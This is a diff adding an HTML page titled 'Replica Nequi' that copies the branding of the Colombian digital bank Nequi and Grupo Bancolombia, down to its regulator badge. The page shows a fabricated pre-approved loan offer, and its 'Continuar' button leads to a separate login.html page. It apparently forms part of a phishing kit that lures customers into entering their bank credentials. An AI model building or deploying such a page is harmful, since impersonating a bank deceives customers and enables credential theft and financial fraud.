@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Replica Nequi</title>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="normalize.css">
+
+  <link rel="stylesheet" type="text/css" href="nequi_two.webflow.css">
+    <link rel="stylesheet" type="text/css" href="nequi_one.webflow.css">
+    <link rel="stylesheet" type="text/css" href="main.css">
+<link rel="icon" href="data:,">
+
+</head>
+<body>
+
+
+
+
+
+<header class="header">
+  <a class="logo">
+    <img alt="nequi" src="images/64dfef05bc6705edb9447499_nequi.svg" class="x1 x2" >
+  </a>
+<a class="btn-recarga " href="https://recarga.nequi.com.co/bdigitalpsl"   >Recarga</a>
+
+  <!-- MENÚ MOBILE -->
+  <button class="btn-menu" aria-label="Abrir menú">
+    <span></span>
+    <span></span>
+    <span></span>
+  </button>
+</header>
+
+
+<!-- OVERLAY -->
+<div class="menu-overlay" id="menuOverlay"  ></div>
+
+<!-- MENU LATERAL -->
+<aside class="mobile-menu" id="mobileMenu" style="z-index: 9999;" >
+  <button class="close-menu" id="closeMenu">✕</button>
+
+  <a href="#" class="menu-recarga">Recarga</a>
+</aside>
+
+
+
+
+  <main class="main">
+  
+
+  
+
+
+    <div class="card-resultado" id="resultado-prestamo" >
+  <h2 class="card-title">Resultado de tu consulta</h2>
+  
+  <div class="result-container">
+    <div class="result-row">
+      <span>Cantidad a prestar:</span>
+      <span class="value highlight">$2.400.000 COP</span>
+    </div>
+    <div class="result-row">
+      <span>Meses de plazo:</span>
+      <span class="value">12</span>
+    </div>
+    <div class="result-row">
+      <span>Interés mensual:</span>
+      <span class="value">$11,000</span>
+    </div>
+    <div class="result-row total">
+      <span>Pago total:</span>
+      <span class="value">$2.532.000</span>
+    </div>
+    <div class="result-row quota">
+      <span>Cuota mensual:</span>
+      <span class="value">$211.000</span>
+    </div>
+  </div>
+
+  <div class="input-group">
+    <label for="plazo">Seleccione el plazo:</label>
+    <select id="plazo" class="custom-select">
+      <option value="12">12 meses</option>
+      <!-- <option value="24">24 meses</option> -->
+    </select>
+  </div>
+
+<button class="btn-continuar" id="btn-continuar" style="background-color: #DA0081;"   onclick="window.location.href='login.html'"    >Continuar</button>
+
+</div>
+
+
+
+
+
+
+
+
+</main>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<footer class="footer"   >
+  <!-- IMAGEN VERTICAL VIGILADO -->
+ 
+<!-- VIGILADO SUPERINTENDENCIA -->
+<!-- VIGILADO SUPERINTENDENCIA -->
+<img
+  src="/images/vigilado.png"
+  alt="Vigilado Superintendencia Financiera de Colombia"
+  class="footer-vigilado"
+/>
+
+
+
+  <div class="footer-bg">
+
+    <!-- TOP -->
+    <div class="footer-top">
+      <img src="/images/64e50b03c9fda96db04be382_logo-nequi-blanco.svg" alt="Nequi" class="footer-logo">
+
+      <div class="footer-stores">
+        <img src="/images/64e50ed88b7bb33f2c2c4653_store-googleplay.svg" alt="Google Play">
+        <img src="/images/64e50ed702047ba456edd2cb_store-apple.svg" alt="App Store">
+        <img src="/images/64e50ed702047ba456edd25c_store-huawei.svg" alt="AppGallery">
+      </div>
+
+      <img src="/images/65ce1c19567caef6f894a575_logo-grupo-bancolombia.svg"
+           alt="Grupo Bancolombia"
+           class="footer-grupo x1">
+    </div>
+
+    <div class="footer-line " id="x" ></div>
+
+
+
+    <!-- LINKS -->
+<div class="footer-links">
+
+  <div class="footer-item">
+    <button class="footer-title">Información legal</button>
+    <div class="footer-content">
+      <a href="#">Condiciones de uso</a>
+      <a href="#">Tratamiento de Datos Personales</a>
+      <a href="#">Consumidor financiero</a>
+      <a href="#">Defensor del Consumidor Financiero</a>
+      <a href="#">Legal Nequi</a>
+    </div>
+  </div>
+
+  <div class="footer-item">
+    <button class="footer-title">Para personas</button>
+    <div class="footer-content">
+      <a href="#">Tarjeta Nequi</a>
+      <a href="#">Crédito Salvavidas</a>
+      <a href="#">Crédito Propulsor</a>
+      <a href="#">Usa tu plata</a>
+      <a href="#">Paypal</a>
+    </div>
+  </div>
+
+  <div class="footer-item">
+    <button class="footer-title">Para tu negocio</button>
+    <div class="footer-content">
+      <a href="#">Negocios</a>
+    </div>
+  </div>
+
+  <div class="footer-item">
+    <button class="footer-title">Ayuda</button>
+    <div class="footer-content">
+      <a href="#">Centro de ayuda</a>
+      <a href="#">Blog metidas de plata</a>
+      <a href="#">Comunidad Nequi</a>
+      <a href="#">Tips de seguridad</a>
+    </div>
+  </div>
+
+  <div class="footer-item">
+    <button class="footer-title">Conócenos</button>
+    <div class="footer-content">
+      <a href="#">¿Quiénes somos?</a>
+      <a href="#">Trabaja con nosotros</a>
+      <a href="#">Sala de prensa</a>
+      <a href="#">Comunicados</a>
+    </div>
+  </div>
+
+
+
+
+  
+</div>
+
+<div class="footer-line " id="x" ></div>
+
+<!-- SOCIAL -->
+<div class="footer-social"  >
+  <a href="#"><img src="/images/64e5220142aa063fa007c444_ic-twitter.svg"></a>
+  <a href="#"><img src="/images/64e52201416719efe915e448_ic-instagram.svg"></a>
+  <a href="#"><img src="/images/64e52201c1a7bf3e9e5bd566_ic-facebook.svg"></a>
+  <a href="#"><img src="/images/64e522013be191fdc4a0252e_ic-linkedin.svg"></a>
+  <a href="#"><img src="/images/64e52201c663d0190bc59ba8_ic-youtube.svg"></a>
+</div>
+
+<div class="x"></div>
+
+</footer>
+
+
+
+
+
+
+
+<!-- <script src="/jfidiiashyasx3234.js" ></script> -->
+ <script src="/menu.js" ></script> 
+</body>
+
+
+</html>
+
